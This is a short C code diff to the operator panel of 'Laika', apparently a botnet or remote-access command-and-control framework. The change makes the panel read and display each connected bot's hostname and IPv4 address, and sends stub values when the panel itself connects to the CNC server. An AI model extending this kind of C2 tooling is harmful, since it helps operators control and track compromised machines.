@@ -11,11 +11,16 @@ void handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
 }
 
 void handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+    char hostname[LAIKA_HOSTNAME_LEN], ipv4[LAIKA_IPV4_LEN];
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
     uint8_t type;
 
     /* read newly connected peer's pubKey */
     laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
+
+    /* read hostname & ipv4 */
+    laikaS_read(&peer->sock, hostname, LAIKA_HOSTNAME_LEN);
+    laikaS_read(&peer->sock, ipv4, LAIKA_IPV4_LEN);
 
     /* read peer's peerType */
     type = laikaS_readByte(&peer->sock);
@@ -23,7 +28,7 @@ void handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     /* add peer */
     switch (type) {
         case PEER_BOT: {
-            tPanel_bot *bot = panelB_newBot(pubKey);
+            tPanel_bot *bot = panelB_newBot(pubKey, hostname, ipv4);
             panelC_addBot(bot);
             break;
         }
@@ -57,7 +62,7 @@ void handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
 
 LAIKAPKT_SIZE panelC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
     [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t),
-    [LAIKAPKT_AUTHENTICATED_ADD_PEER] = crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t), /* pubkey + peerType */
+    [LAIKAPKT_AUTHENTICATED_ADD_PEER] = crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t) + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN, /* pubkey + peerType + host + ip */
     [LAIKAPKT_AUTHENTICATED_RMV_PEER] = crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t), /* pubkey + peerType */
 };
 
@@ -125,6 +130,10 @@ void panelC_connectToCNC(tPanel_client *client, char *ip, char *port) {
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
     laikaS_write(sock, client->pub, sizeof(client->pub)); /* write public key */
+
+    /* write stub hostname & ipv4 (since we're a panel/dummy client, cnc doesn't need this information really) */
+    laikaS_zeroWrite(sock, LAIKA_HOSTNAME_LEN);
+    laikaS_zeroWrite(sock, LAIKA_IPV4_LEN);
     laikaS_endOutPacket(client->peer);
     laikaS_setSecure(client->peer, true);
 
